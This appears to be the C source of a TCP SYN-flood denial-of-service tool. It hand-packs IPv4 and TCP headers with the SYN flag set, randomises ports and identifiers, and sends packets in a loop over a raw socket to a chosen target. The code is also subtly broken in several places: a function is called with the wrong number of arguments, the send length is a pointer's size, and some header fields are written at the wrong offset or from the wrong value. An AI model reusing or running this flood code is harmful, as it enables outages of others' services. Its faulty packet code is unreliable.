#include "dos_syn.h"

static Buffer buf;

static void copy_ip_version_ihl(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {((payload->ip->version) << 4) | (payload->ip->ihl)};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_tos(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->tos};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_total_length(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->total_length) >> 8),
        ((payload->ip->total_length) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_identification(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->identification) >> 8),
        ((payload->ip->identification) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_flags_fragment_offset(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->flags) << 5) | ((payload->ip->fragment_offset) >> 8),
        ((payload->ip->flags) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_ip_ttl(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->ttl};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_protocol(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {payload->ip->protocol};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_ip_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->ip->checksum) >> 8),
        ((payload->ip->checksum) & 0xff)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_src_port(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->src_port) >> 8),
        ((payload->tcp->src_port) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_dst_port(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->dst_port) >> 8),
        ((payload->tcp->dst_port) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_sequence(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[4] = {
        ((payload->tcp->sequence) >> 24),
        ((payload->tcp->sequence) >> 16),
        ((payload->tcp->sequence) >> 8),
        ((payload->tcp->sequence) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_acknowledgement(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[4] = {
        ((payload->tcp->acknowledgement) >> 24),
        ((payload->tcp->acknowledgement) >> 16),
        ((payload->tcp->acknowledgement) >> 8),
        ((payload->tcp->acknowledgement) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index) += 4;
    return;
}

static void copy_tcp_data_offset(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {((payload->tcp->data_offset) << 4)};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf ), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_flags(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {
        ((payload->tcp->cwr) << 7) |
        ((payload->tcp->ece) << 6) |
        ((payload->tcp->urg) << 5) |
        ((payload->tcp->ack) << 4) |
        ((payload->tcp->psh) << 3) |
        ((payload->tcp->rst) << 2) |
        ((payload->tcp->syn) << 1) |
        ((payload->tcp->fin) << 0)
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    return;
}

static void copy_tcp_window(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->window) >> 8),
        ((payload->tcp->window) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->tcp->checksum) >> 8),
        ((payload->tcp->checksum) & 0xff),
    };
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_urgent_pointer(Buffer *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {0, 0};
    unsigned char *tmp_buf = buf->buffer;
    unsigned short index = buf->index;
    memcpy((tmp_buf + index), tmp_src_buf, sizeof (tmp_src_buf));
    (buf->index)++;
    (buf->index)++;
    return;
}

static void copy_tcp_pseudo_zeros(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {0};
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static void copy_tcp_pseudo_protocol(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[1] = {0x6};
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static void copy_tcp_pseudo_tcp_length(unsigned char *buf, Payload *payload) {
    unsigned char tmp_src_buf[2] = {
        ((payload->pseudo->protocol) << 8),
        ((payload->pseudo->protocol) & 0xff)
    };
    memcpy(buf, tmp_src_buf, sizeof (tmp_src_buf));
    return;
}

static int checksum(unsigned char *buf, size_t buf_len) {
    unsigned long value = 0;
    unsigned long word = 0;
    size_t i;
    for (i = 0; i < buf_len; i += 2) {
        word = (buf[i] << 8) + (i + 1 < buf_len ? buf[i + 1] : 0);
        value += word;
    }
    value = (value >> 16) + (value & 0xffff);
    value = (~value & 0xffff);
    return (int) value;
}

static void handle_ip_checksum(Buffer *buf, Payload *payload) {
    payload->ip->checksum = checksum(buf->buffer, buf->ip_length);
    buf->index = 10;
    copy_ip_checksum(buf, payload);
    buf->index = buf->ip_length;
    return;
}

static void handle_tcp_checksum(Buffer *buf, Payload *payload) {
    unsigned char tmp_buf[(buf->tcp_length) + (buf->tcp_pseudo_length)];
    buf->index = buf->ip_length;
    memcpy(tmp_buf, ((buf->buffer) + (buf->index)), (size_t) buf->tcp_length);
    pack_tcp_pseudo_header((tmp_buf + buf->tcp_length), payload);
    payload->tcp->checksum = checksum(tmp_buf, sizeof (tmp_buf));
    return;
}

static unsigned int get_random_port(void) {
    return (rand() % MAX_RANDOM_RANGE);
}

static unsigned int get_random_identification(void) {
    return (rand() % MAX_RANDOM_IDENTIFICATION);
}

static unsigned long get_random_sequence(void) {
    return (rand() % MAX_RANDOM_SEQUENCE);
}

static void reset_headers(IPv4_Header *ip, TCP_Header *tcp) {
    ip->identification = 0;
    ip->checksum = 0;
    tcp->src_port = 0;
    tcp->dst_port = 0;
    tcp->sequence = 0;
    tcp->checksum = 0;
    return;
}

static void randomize_headers(IPv4_Header *ip, TCP_Header *tcp, struct sockaddr_in *addr, DoS_SYN_args *args) {
    ip->identification = get_random_identification();
    tcp->src_port = get_random_port();
    unsigned int random_port = get_random_port();
    tcp->dst_port = (args->rand_port) ? (args->port) : (random_port);
    addr->sin_port = (args->rand_port) ? (htons(args->port)) : (htons(random_port));
    tcp->sequence = get_random_sequence();
    return;
}

unsigned int init_socket(void) {
    unsigned int sockfd;
    unsigned short optval;
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &optval, (socklen_t) sizeof (optval));
    return sockfd;
}

void pack_ipv4_header(Buffer *buf, Payload *payload) {
    copy_ip_version_ihl(buf, payload);
    copy_ip_tos(buf, payload);
    copy_ip_total_length(buf, payload);
    copy_ip_flags_fragment_offset(buf, payload);
    copy_ip_ttl(buf, payload);
    copy_ip_protocol(buf, payload);
    copy_ip_checksum(buf, payload);
    memcpy((buf->buffer) + (buf->index), payload->ip->src_addr, sizeof (payload->ip->src_addr));
    (buf->index) += 4;
    memcpy((buf->buffer) + (buf->index), payload->ip->dst_addr, sizeof (payload->ip->dst_addr));
    (buf->index) += 4;
    return;
}

void pack_tcp_header(Buffer *buf, Payload *payload) {
    copy_tcp_src_port(buf, payload);
    copy_tcp_dst_port(buf, payload);
    copy_tcp_sequence(buf, payload);
    copy_tcp_acknowledgement(buf, payload);
    copy_tcp_data_offset(buf, payload);
    copy_tcp_flags(buf, payload);
    copy_tcp_window(buf, payload);
    copy_tcp_checksum(buf, payload);
    copy_tcp_urgent_pointer(buf, payload);
    return;
}

void pack_tcp_pseudo_header(unsigned char *buf, Payload *payload) {
    unsigned char index = 0;
    memcpy(buf, payload->pseudo->src_addr, sizeof (payload->pseudo->src_addr));
    index += 4;
    memcpy((buf + index), payload->pseudo->dst_addr, sizeof (payload->pseudo->dst_addr));
    index += 4;
    copy_tcp_pseudo_zeros((buf + index), payload);
    index++;
    copy_tcp_pseudo_protocol((buf + index), payload);
    index++;
    copy_tcp_pseudo_tcp_length((buf + index), payload);
    return;
}

unsigned int push_payload(int sockfd, Buffer *buf, Payload *payload, struct sockaddr_in *addr) {
    pack_ipv4_header(buf, payload);
    handle_ip_checksum(buf, payload);
    pack_tcp_header(buf, payload);
    handle_tcp_checksum(buf, payload);
    int length = sendto(
        sockfd,
        buf->buffer,
        sizeof ((char *) buf->buffer),
        0,
        ((struct sockaddr *) addr),
        ((socklen_t) sizeof (struct sockaddr_in))
    );
    return ((length == 0) ? 0 : 1);
}

unsigned int flood(DoS_SYN_args *args) {
    buf.buffer = malloc(PAYLOAD_SIZE * sizeof(char));
    buf.index = 0;
    buf.ip_length = 20;
    buf.tcp_length = 20;
    buf.tcp_pseudo_length = 12;
    int sockfd = init_socket();

    IPv4_Header ip = {
        0x4, 0x5, 0x0, PAYLOAD_SIZE,
        0x0, 0x0, 0x0, 0xff, 0x6, 0x0,
        *(args->src_addr), *(args->dst_addr)
    };

    TCP_Header tcp = {
        0x0, 0x0, 0x0, 0x0, 0x5,
        0x0, 0x0, 0x0, 0x0, 0x0,
        0x0, 0x1, 0x0, 0xffff, 0x0, 0x0
    };

    TCP_Pseudo_Header pseudo = {
        *(args->src_addr),
        *(args->dst_addr),
        0x0, 0x6, buf.tcp_length
    };
    /* TODO: convert ip address to proper and global type */
    struct in_addr ip_addr = {
        (in_addr_t) args->dst_addr
    };

    struct sockaddr_in addr = {
        AF_INET,
        ntohs(0x0),
        ip_addr
    };

    Payload payload = {&ip, &tcp, &pseudo};
    while ((args->count)--) {
        push_payload(sockfd, &buf, &addr);
    }
    return 0;
}
